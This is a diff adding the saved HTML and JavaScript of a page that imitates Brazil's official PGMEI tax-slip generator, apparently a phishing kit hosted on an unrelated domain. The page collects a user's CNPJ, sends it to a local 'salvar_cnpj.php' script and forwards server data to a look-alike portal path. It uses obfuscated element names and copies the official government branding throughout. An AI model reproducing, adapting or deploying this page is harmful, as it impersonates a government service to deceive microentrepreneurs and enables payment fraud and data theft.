@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<!-- saved from url=(0148)https://afcallstars.com/app/micro/portao/?chave=ZXPyO0v9vbW56j20c443Bfh63o7m8Uey7L03PC8vptsuA6kwtof70TIuHCQPkBQcejUM5G8e1fTUQgLlVfzyJmSS7ou6NoIu2YKN -->
+<html lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</title>
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./ladda-themeless.min.css">
+    <link rel="icon" type="image/x-icon" href="https://afcallstars.com/favicon.ico">
+            <!-- reCAPTCHA Enterprise DESATIVADO - Script não carregado -->
+        <style>
+        .k4d7s {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999;
+        }
+
+        .n6p9w {
+            background: #d9534f;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 5px;
+            margin: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        .m2v5h {
+            background: #d9534f;
+        }
+
+        .l8c3t {
+            float: right;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        /* Prevenir zoom automático no iPhone */
+        #f5h8v {
+            font-size: 16px !important;
+            /* iOS não faz zoom se fonte >= 16px */
+        }
+
+        @media screen and (max-width: 768px) {
+
+            /* Garantir que inputs tenham fonte grande o suficiente no mobile */
+            input.form-control {
+                font-size: 16px !important;
+            }
+        }
+
+        /* Ocultar elemento g-recaptcha-enterprise-index - reCAPTCHA Enterprise não usa widgets visíveis */
+        #g-recaptcha-enterprise-index {
+            position: relative !important;
+            display: inline-block !important;
+            margin-top: 10px !important;
+            z-index: 10 !important;
+        }
+    </style>
+<style type="text/css"></style><style type="text/css"></style></head>
+
+<body>
+
+    <input type="hidden" id="x7k9m" value="6LfkzS4sAAAAAL0XQAqLCWCXmSPXjBL53R7ec0Ll">
+    <input type="hidden" id="w2p4n" value="false">
+    <div class="container-fluid">
+        <header class="row">
+            <h3><span class="label label-success">
+                    <img alt="Brand" src="./logo-simples.png"> PGMEI</span></h3>
+            <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
+        </header>
+
+        <section class="row">
+            <div class="well col-md-12" role="main">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-offset-3 col-md-5">
+                            <div class="panel panel-default">
+                                <div class="panel-heading">
+                                    <h4 class="panel-title">Informe o número completo do CNPJ</h4>
+                                </div>
+                                <div class="panel-body">
+                                    <form id="r3t6b">
+                                        <div class="form-group">
+                                            <div class="col-md-offset-1 col-md-8">
+                                                <label for="f5h8v" class="control-label">CNPJ completo:</label>
+                                                <input type="text" id="f5h8v" class="form-control" name="cnpj" autocomplete="off" title="Deve ser informado CNPJ completo, inclusive com o dígito verificador, sem separadores de números, pontos ou traços." placeholder="__.___.___/____-__">
+
+                                                <!-- Div para o widget reCAPTCHA Enterprise invisível -->
+                                                <div id="g-recaptcha-enterprise-index" style="margin-top: 10px;"></div>
+                                                <div style="color: rgb(85, 85, 85); font-weight: 500; font-size: 8px; cursor: pointer; text-decoration: none; display: inline-block; line-height: 8px;">
+                                                    <br>
+                                                    <strong> Protegido por hCaptcha </strong> <br>
+                                                    <a class="link" tabindex="0" aria-label="Política de Privacidade do hCaptcha" href="https://hcaptcha.com/privacy"> Privacidade</a> e
+                                                    <a class="link" tabindex="0" aria-label="Termos e Condições do hCaptcha" href="https://hcaptcha.com/terms"> Termos e condições</a>.
+                                                </div>
+                                            </div>
+                                            <div class="col-md-offset-1 col-md-11">
+                                                <button type="submit" id="q9j2x" class="btn btn-success ladda-button" data-style="slide-left">
+                                                    <span class="ladda-label">Continuar</span>
+                                                <span class="ladda-spinner"></span></button>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <footer class="row clearfix">
+            <div class="pull-left">
+                <p class="text-success"><strong>Versão: 3.16.1</strong></p>
+            </div>
+            <div class="pull-right"><img src="./marca_Simples_entes.png" alt=""></div>
+        </footer>
+    </div>
+
+    <!-- Toast para erros -->
+    <div id="z8m3y" class="k4d7s"></div>
+
+    <script src="./spin.min.js.download"></script>
+    <script src="./ladda.min.js.download"></script>
+
+    <script>
+        // Verificar se reCAPTCHA está ativo
+        let recaptchaAtivo = document.getElementById('w2p4n').value === 'true';
+
+        console.log('🔍 recaptchaAtivo:', recaptchaAtivo);
+
+        // Variáveis globais para reCAPTCHA Enterprise (definir ANTES do script carregar)
+        // Pegar o valor do input hidden com id="sitekey"
+        let sitekeyElement = document.getElementById('x7k9m');
+        let SITE_KEY_INDEX = sitekeyElement.value;
+        let recaptchaTokenIndex = null;
+        let recaptchaWidgetIdIndex = null;
+
+        // Função chamada quando o script do reCAPTCHA carrega (onload) - DEFINIR ANTES DO SCRIPT
+        window.onloadRecaptchaEnterprise = function() {
+            console.log('🔄 onloadRecaptchaEnterprise chamado!');
+            console.log('🔍 recaptchaAtivo:', recaptchaAtivo);
+
+            if (!recaptchaAtivo) {
+                console.log('ℹ️ reCAPTCHA desativado - widget não será criado');
+                return;
+            }
+
+            if (typeof grecaptcha === 'undefined' || typeof grecaptcha.enterprise === 'undefined') {
+                console.warn('⚠️ reCAPTCHA Enterprise não está disponível');
+                return;
+            }
+
+            try {
+                // Criar widget invisível (igual ao exemplo que funciona)
+                recaptchaWidgetIdIndex = grecaptcha.enterprise.render('g-recaptcha-enterprise-index', {
+                    sitekey: SITE_KEY_INDEX,
+                    size: 'invisible', // Widget invisível - permite gerar token via execute()
+                    callback: function(token) {
+                        console.log('✅ Token gerado via callback:', token ? token.substring(0, 20) + '...' : 'null');
+                        recaptchaTokenIndex = token;
+                    },
+                    'expired-callback': function() {
+                        console.log('⚠️ Token expirado');
+                        recaptchaTokenIndex = null;
+                        recaptchaWidgetIdIndex = null;
+                    },
+                    'error-callback': function() {
+                        console.error('❌ Erro no widget reCAPTCHA');
+                        recaptchaTokenIndex = null;
+                        recaptchaWidgetIdIndex = null;
+                    }
+                });
+                console.log('✅ Widget reCAPTCHA Enterprise criado com sucesso! Widget ID:', recaptchaWidgetIdIndex);
+            } catch (e) {
+                console.error('❌ Erro ao criar widget reCAPTCHA Enterprise:', e);
+                recaptchaWidgetIdIndex = null;
+            }
+        };
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const input = document.getElementById('f5h8v');
+            const button = document.getElementById('q9j2x');
+            let l = null;
+
+            // Formata CNPJ automaticamente
+            input.addEventListener('input', () => {
+                let v = input.value.replace(/\D/g, '').slice(0, 14);
+                if (v.length >= 12) v = v.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, '$1.$2.$3/$4-$5');
+                else if (v.length >= 8) v = v.replace(/(\d{2})(\d{3})(\d{3})(\d{4})/, '$1.$2.$3/$4-');
+                else if (v.length >= 5) v = v.replace(/(\d{2})(\d{3})(\d{3})/, '$1.$2.$3/');
+                else if (v.length >= 2) v = v.replace(/(\d{2})(\d{3})/, '$1.$2.');
+                input.value = v;
+            });
+
+            // Validação básica
+            function validarCNPJ(cnpj) {
+                cnpj = cnpj.replace(/\D/g, '');
+                if (cnpj.length !== 14) return false;
+                if (/^(\d)\1+$/.test(cnpj)) return false;
+                return true;
+            }
+
+            // Função para log (apenas console, sem salvar em arquivo)
+            function saveLog(level, message, context = null) {
+                // Apenas loga no console
+                if (level === 'ERROR') {
+                    console.error(message, context);
+                } else if (level === 'WARN') {
+                    console.warn(message, context);
+                } else {
+                    console.log(message, context);
+                }
+            }
+
+            function showError(msg) {
+                const toast = document.createElement('div');
+                toast.className = 'n6p9w m2v5h';
+                toast.innerHTML = `<button class="l8c3t">×</button><div>${msg}</div>`;
+                document.getElementById('z8m3y').appendChild(toast);
+                toast.querySelector('.l8c3t').onclick = () => toast.remove();
+                setTimeout(() => toast.remove(), 5000);
+            }
+
+            saveLog('INFO', '✅ Script carregado - aguardando submit do formulário');
+
+            const form = document.getElementById('r3t6b');
+            if (!form) {
+                saveLog('ERROR', '❌ Formulário não encontrado!');
+                showError('Erro: Formulário não encontrado.');
+                return;
+            }
+
+            // Usar variáveis globais já definidas acima (SITE_KEY_INDEX, recaptchaTokenIndex, recaptchaWidgetIdIndex)
+            // A função onloadRecaptchaEnterprise já está definida globalmente acima
+
+            // Função para executar reCAPTCHA Enterprise (igual ao exemplo que funciona)
+            async function executarRecaptcha() {
+                console.log('🔄 executarRecaptcha() chamado');
+                console.log('🔍 recaptchaAtivo:', recaptchaAtivo);
+                console.log('🔍 recaptchaWidgetIdIndex:', recaptchaWidgetIdIndex);
+
+                // Se reCAPTCHA está desativado, não tentar executar
+                if (!recaptchaAtivo) {
+                    console.log('ℹ️ reCAPTCHA desativado, retornando null');
+                    recaptchaTokenIndex = null;
+                    return null;
+                }
+
+                // Se o script não foi carregado ainda, aguardar (máximo 5 segundos)
+                let tentativas = 0;
+                const maxTentativas = 25; // 25 * 200ms = 5 segundos
+
+                console.log('⏳ Aguardando grecaptcha.enterprise estar disponível...');
+                while ((typeof grecaptcha === 'undefined' || typeof grecaptcha.enterprise === 'undefined') && tentativas < maxTentativas) {
+                    await new Promise(resolve => setTimeout(resolve, 200));
+                    tentativas++;
+                    if (tentativas % 5 === 0) {
+                        console.log('⏳ Aguardando... tentativa ' + tentativas + '/' + maxTentativas);
+                    }
+                }
+
+                if (typeof grecaptcha === 'undefined' || typeof grecaptcha.enterprise === 'undefined') {
+                    console.error('❌ reCAPTCHA Enterprise não carregou após 5 segundos');
+                    throw new Error('reCAPTCHA Enterprise não carregou após 5 segundos');
+                }
+
+                console.log('✅ grecaptcha.enterprise está disponível');
+
+                // Verificar se o widget foi criado
+                if (recaptchaWidgetIdIndex === null) {
+                    console.log('⏳ Widget ainda não foi criado, tentando criar...');
+                    // Tentar criar o widget se ainda não foi criado
+                    try {
+                        recaptchaWidgetIdIndex = grecaptcha.enterprise.render('g-recaptcha-enterprise-index', {
+                            sitekey: SITE_KEY_INDEX,
+                            size: 'invisible'
+                        });
+                        console.log('✅ Widget criado agora! Widget ID:', recaptchaWidgetIdIndex);
+                    } catch (e) {
+                        console.error('❌ Erro ao criar widget:', e);
+                        throw new Error('Erro ao criar widget reCAPTCHA');
+                    }
+                } else {
+                    console.log('✅ Widget já existe, Widget ID:', recaptchaWidgetIdIndex);
+                }
+
+                try {
+                    // RESETAR o widget antes de executar (igual ao exemplo que funciona!)
+                    console.log('🔄 Resetando widget reCAPTCHA antes de executar...');
+                    grecaptcha.enterprise.reset(recaptchaWidgetIdIndex);
+
+                    // Aguardar um pouco após reset
+                    await new Promise(resolve => setTimeout(resolve, 500));
+
+                    // Executar usando o widgetId (igual ao exemplo que funciona!)
+                    console.log('🔄 Chamando grecaptcha.enterprise.execute() com widgetId:', recaptchaWidgetIdIndex);
+                    const token = await grecaptcha.enterprise.execute(recaptchaWidgetIdIndex);
+
+                    console.log('✅ Token gerado:', token ? token.substring(0, 20) + '...' : 'null');
+                    console.log('✅ Token completo (primeiros 50 chars):', token ? token.substring(0, 50) + '...' : 'null');
+                    console.log('✅ Tamanho do token:', token ? token.length : 0, 'caracteres');
+                    recaptchaTokenIndex = token;
+                    return token;
+                } catch (err) {
+                    console.error('❌ Erro ao executar reCAPTCHA Enterprise:', err);
+                    console.error('❌ Detalhes do erro:', err.message || JSON.stringify(err));
+                    recaptchaTokenIndex = null;
+                    throw new Error('Erro no reCAPTCHA Enterprise: ' + err.message);
+                }
+            }
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                saveLog('INFO', '🔄 Formulário submetido!');
+
+                const cnpjLimpo = input.value.replace(/\D/g, '');
+                saveLog('INFO', '📝 CNPJ digitado (limpo):', {
+                    cnpj: cnpjLimpo
+                });
+
+                if (!validarCNPJ(cnpjLimpo)) {
+                    saveLog('ERROR', '❌ CNPJ inválido:', {
+                        cnpj: cnpjLimpo
+                    });
+                    showError('CNPJ inválido. Verifique os números.');
+                    return;
+                }
+
+                saveLog('INFO', '✅ CNPJ válido, validando reCAPTCHA...', {
+                    cnpj: cnpjLimpo
+                });
+
+                if (!l) l = Ladda.create(button);
+                l.start();
+
+                try {
+                    // Executar reCAPTCHA apenas se estiver ativo
+                    if (recaptchaAtivo) {
+                        saveLog('INFO', '🔄 Executando reCAPTCHA...');
+                        recaptchaTokenIndex = null;
+                        await executarRecaptcha();
+
+                        // Se não gerou token e está ativo, pode ser erro ou script não carregado
+                        if (!recaptchaTokenIndex && recaptchaAtivo) {
+                            // Verificar se o script realmente está disponível
+                            if (typeof grecaptcha === 'undefined' || typeof grecaptcha.enterprise === 'undefined') {
+                                saveLog('WARN', '⚠️ reCAPTCHA ativo mas script não carregado - continuando sem token');
+                            } else {
+                                throw new Error('Token reCAPTCHA não gerado');
+                            }
+                        } else if (recaptchaTokenIndex) {
+                            saveLog('INFO', '✅ reCAPTCHA validado com sucesso');
+                            saveLog('INFO', '🔑 Token (primeiros 30 chars):', recaptchaTokenIndex.substring(0, 30) + '...');
+                        }
+                    } else {
+                        saveLog('INFO', 'ℹ️ reCAPTCHA desativado, pulando validação...');
+                    }
+
+                    const url = 'salvar_cnpj.php';
+                    saveLog('INFO', '🌐 Fazendo POST para:', {
+                        url: url,
+                        cnpj: cnpjLimpo
+                    });
+
+                    // Montar body com ou sem token
+                    let body = 'cnpj=' + encodeURIComponent(cnpjLimpo);
+                    if (recaptchaTokenIndex) {
+                        body += '&recaptcha_token=' + encodeURIComponent(recaptchaTokenIndex);
+                        saveLog('INFO', '📤 Token será enviado no POST:', {
+                            token_length: recaptchaTokenIndex.length,
+                            token_preview: recaptchaTokenIndex.substring(0, 30) + '...'
+                        });
+                    } else {
+                        saveLog('WARN', '⚠️ Token reCAPTCHA não será enviado (vazio ou desativado)');
+                    }
+
+                    saveLog('INFO', '📤 Body completo do POST:', {
+                        body_length: body.length,
+                        body_preview: body.substring(0, 150) + '...'
+                    });
+
+                    console.log('📤 === ENVIANDO POST ===');
+                    console.log('📤 URL:', url);
+                    console.log('📤 Method: POST');
+                    console.log('📤 Headers:', {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    });
+                    console.log('📤 Body length:', body.length);
+                    console.log('📤 Body completo:', body);
+                    console.log('📤 Token no body?', body.includes('recaptcha_token'));
+                    if (body.includes('recaptcha_token')) {
+                        const tokenMatch = body.match(/recaptcha_token=([^&]+)/);
+                        if (tokenMatch) {
+                            const tokenDecoded = decodeURIComponent(tokenMatch[1]);
+                            console.log('📤 Token encontrado no body (primeiros 30 chars):', tokenDecoded.substring(0, 30) + '...');
+                            console.log('📤 Token completo length:', tokenDecoded.length);
+                        }
+                    }
+
+                    const resp = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: body
+                    });
+
+                    console.log('📥 === RESPOSTA RECEBIDA ===');
+                    console.log('📥 Status:', resp.status);
+                    console.log('📥 Status Text:', resp.statusText);
+                    console.log('📥 OK?', resp.ok);
+                    console.log('📥 Headers:', Object.fromEntries(resp.headers.entries()));
+
+                    saveLog('INFO', '📥 Resposta recebida', {
+                        status: resp.status,
+                        statusText: resp.statusText,
+                        ok: resp.ok
+                    });
+
+                    // Verifica se a resposta é válida (mas mesmo com erro, o PHP retorna 200)
+                    if (!resp.ok && resp.status !== 200) {
+                        const text = await resp.text();
+                        console.error('❌ === ERRO NA RESPOSTA ===');
+                        console.error('❌ Status:', resp.status);
+                        console.error('❌ Status Text:', resp.statusText);
+                        console.error('❌ Response Text (primeiros 500 chars):', text.substring(0, 500));
+
+                        // Tentar parsear como JSON para ver o erro
+                        try {
+                            const errorJson = JSON.parse(text);
+                            console.error('❌ Error JSON:', errorJson);
+                            if (errorJson.error) {
+                                console.error('❌ Mensagem de erro:', errorJson.error);
+                            }
+                        } catch (e) {
+                            console.error('❌ Resposta não é JSON válido');
+                        }
+
+                        throw new Error('Erro HTTP: ' + resp.status);
+                    }
+
+                    const text = await resp.text();
+                    let result;
+
+                    try {
+                        result = JSON.parse(text);
+                    } catch (e) {
+                        console.error('❌ Erro ao parsear JSON:', e);
+                        showError('Resposta inválida do servidor: ' + text.substring(0, 100));
+                        l.stop();
+                        return;
+                    }
+
+                    saveLog('INFO', '📊 Resultado recebido', {
+                        success: result.success,
+                        hasData: !!result.data,
+                        error: result.error,
+                        error_type: result.error_type,
+                        message: result.message
+                    });
+
+                    // ========================================
+                    // VERIFICAR ERRO - PRIMEIRA COISA
+                    // ========================================
+                    if (!result.success) {
+                        const mensagemErro = result.message || 'Erro ao consultar CNPJ.';
+
+                        if (window.toastr) {
+                            let titulo = 'Erro';
+                            if (result.error_type === 'cnpj-invalido') {
+                                titulo = 'CNPJ Inválido';
+                            } else if (result.error_type === 'nao-optante-simei') {
+                                titulo = 'Contribuinte não optante pelo SIMEI';
+                            }
+                            toastr.error(titulo, {
+                                timeOut: 0,
+                                extendedTimeOut: 0,
+                                closeButton: true
+                            });
+                        } else {
+                            showError(mensagemErro);
+                        }
+
+                        l.stop();
+                        document.getElementById('r3t6b')?.querySelector('button[type="submit"]')?.removeAttribute('disabled');
+                        return;
+                    }
+
+                    // ========================================
+                    // SÓ CHEGA AQUI SE result.success === true
+                    // ========================================
+                    if (result.success === true) {
+                        // Verifica se tem dados
+                        if (!result.data) {
+                            saveLog('ERROR', '❌ Dados não recebidos do servidor');
+                            showError('Dados não recebidos do servidor.');
+                            l.stop();
+                            return;
+                        }
+
+                        saveLog('INFO', '✅ Dados recebidos, preparando para enviar via POST...');
+
+                        // Codifica os dados em base64 para passar via POST
+                        // Usa encodeURIComponent + btoa para garantir UTF-8 correto
+                        const jsonString = JSON.stringify(result.data);
+                        const dadosEncoded = btoa(unescape(encodeURIComponent(jsonString)));
+                        saveLog('INFO', '🔐 Dados codificados', {
+                            tamanho: dadosEncoded.length,
+                            preview: dadosEncoded.substring(0, 50)
+                        });
+
+                        // Monta URL de destino (sem dados na URL - GET fica livre para outras coisas)
+                        const redirectUrl = result.redirect || 'Aplicacoes/ATSPO/pgmei.app/Home/Inicio/index.php';
+                        // saveLog('INFO', '🔗 Redirect URL do servidor', {
+                        //     redirect: redirectUrl
+                        // });
+
+                        let baseUrl;
+
+                        // Monta URL relativa (sem http://)
+                        if (redirectUrl.startsWith('/')) {
+                            baseUrl = redirectUrl;
+                        } else if (redirectUrl.startsWith('Aplicacoes')) {
+                            baseUrl = '/app/micro/Home/Inicio/index.php';
+                        } else {
+                            baseUrl = '/app/micro/Home/Inicio/index.php';
+                        }
+
+                        // Remove http:// se estiver presente (deve ser relativa)
+                        if (baseUrl.startsWith('http://') || baseUrl.startsWith('https://')) {
+                            const urlObj = new URL(baseUrl);
+                            baseUrl = urlObj.pathname;
+                            saveLog('WARN', '⚠️ URL tinha protocolo, removido', {
+                                original: baseUrl,
+                                nova: urlObj.pathname
+                            });
+                        }
+
+                        saveLog('INFO', '🚀 URL de destino montada', {
+                            baseUrl: baseUrl
+                        });
+                        saveLog('INFO', '⏳ Criando formulário POST...');
+
+                        // Para o spinner
+                        l.stop();
+
+                        // SEMPRE usa POST para passar dados (mais seguro e sem limite de tamanho)
+                        // Garante que a action seja relativa (sem protocolo/host)
+                        let actionUrl = baseUrl;
+                        if (actionUrl.startsWith('http://') || actionUrl.startsWith('https://')) {
+                            const urlObj = new URL(actionUrl);
+                            actionUrl = urlObj.pathname;
+                            saveLog('WARN', '⚠️ baseUrl tinha protocolo, removido', {
+                                original: baseUrl,
+                                nova: actionUrl
+                            });
+                        }
+
+                        const form = document.createElement('form');
+                        form.method = 'POST';
+                        form.action = actionUrl; // URL relativa
+                        form.style.display = 'none';
+                        form.enctype = 'application/x-www-form-urlencoded';
+                        form.id = 'redirectForm_' + Date.now(); // ID único para debug
+
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = 'dados';
+                        input.value = dadosEncoded;
+                        form.appendChild(input);
+
+                        saveLog('INFO', '✅ Formulário POST criado', {
+                            formId: form.id,
+                            method: form.method,
+                            action: form.action,
+                            baseUrl: baseUrl,
+                            actionUrl: actionUrl,
+                            inputName: input.name,
+                            inputValueLength: input.value.length,
+                            inputValuePreview: input.value.substring(0, 50)
+                        });
+
+                        document.body.appendChild(form);
+                        saveLog('INFO', '✅ Formulário adicionado ao DOM', {
+                            formId: form.id
+                        });
+
+                        // Verifica se o formulário está realmente no DOM
+                        const formInDOM = document.getElementById(form.id);
+                        if (!formInDOM) {
+                            saveLog('ERROR', '❌ Formulário NÃO está no DOM após appendChild!');
+                        } else {
+                            saveLog('INFO', '✅ Formulário confirmado no DOM', {
+                                formId: form.id
+                            });
+                        }
+
+                        saveLog('INFO', '⏳ Submetendo formulário POST agora...', {
+                            action: baseUrl
+                        });
+
+                        // Força o submit imediatamente (sem setTimeout)
+                        try {
+                            saveLog('INFO', '🔄 Executando form.submit()...', {
+                                formId: form.id
+                            });
+                            form.submit();
+                            saveLog('INFO', '✅ form.submit() executado sem erros');
+                        } catch (e) {
+                            console.error('❌ Erro no form.submit():', e);
+                            saveLog('ERROR', '❌ Erro ao executar form.submit()', {
+                                error: e.message,
+                                stack: e.stack
+                            });
+                            // Fallback: tenta submit do elemento do DOM
+                            try {
+                                const formElement = document.getElementById(form.id);
+                                if (formElement) {
+                                    formElement.submit();
+                                    saveLog('INFO', '✅ Submit via getElementById executado');
+                                }
+                            } catch (e2) {
+                                saveLog('ERROR', '❌ Erro no fallback submit', {
+                                    error: e2.message
+                                });
+                            }
+                        }
+                    } else {
+                        saveLog('ERROR', '❌ Success = false', {
+                            error: result.error
+                        });
+                        showError(result.error || 'Erro ao salvar CNPJ.');
+                        l.stop();
+                    }
+                } catch (err) {
+                    saveLog('ERROR', '❌ ERRO CAPTURADO', {
+                        name: err.name,
+                        message: err.message,
+                        stack: err.stack
+                    });
+
+                    // Se for erro de reCAPTCHA, mostrar mensagem específica
+                    if (err.message.includes('reCAPTCHA') || err.message.includes('Token')) {
+                        showError('Erro na validação de segurança. Por favor, recarregue a página e tente novamente.');
+                    } else {
+                        showError('Erro de conexão: ' + err.message);
+                    }
+
+                    l.stop();
+                }
+            });
+
+            saveLog('INFO', '✅ Listener do formulário adicionado com sucesso');
+        });
+    </script>
+
+    <script src="./jquery.js.download"></script>
+    <script src="./bootstrap.js.download"></script>
+    <script src="./ladda.js.download"></script>
+    <script src="./toastr.js.download"></script>
+    <script src="./select.js.download"></script>
+    <script src="./pgmei_old.js.download"></script>
+    <script src="./pgmei_layout.js.download"></script>
+    <script>
+        $(document).ready(function() {
+            const mask = '__.___.___/____-__';
+
+            function applyMask(value) {
+                let maskedValue = mask.split('');
+                let valueIndex = 0;
+
+                for (let i = 0; i < maskedValue.length; i++) {
+                    if (maskedValue[i] === '_' && value[valueIndex] !== undefined) {
+                        maskedValue[i] = value[valueIndex];
+                        valueIndex++;
+                    }
+                }
+                return maskedValue.join('');
+            }
+
+            $('#f5h8v').on('input', function() {
+                let value = this.value.replace(/\D/g, ''); // Remove all non-digit characters
+                let newValue = applyMask(value);
+                this.value = newValue;
+
+                // Calcula a nova posição do cursor
+                let cursorPosition = newValue.indexOf('_');
+                if (cursorPosition === -1) cursorPosition = newValue.length;
+
+                // Mantém o cursor na posição correta
+                this.setSelectionRange(cursorPosition, cursorPosition);
+            });
+
+            // Força o placeholder ao carregar a página
+            if ($('#f5h8v').val().length === 0) {
+                $('#f5h8v').attr('placeholder', mask);
+            }
+
+            // Seta foco inicial para o CNPJ
+            $('#f5h8v').focus();
+        });
+    </script>
+
+<script defer="" src="./v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;dd110d9ffc2e4424834f04255bb9c1bf&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+
+</body></html>
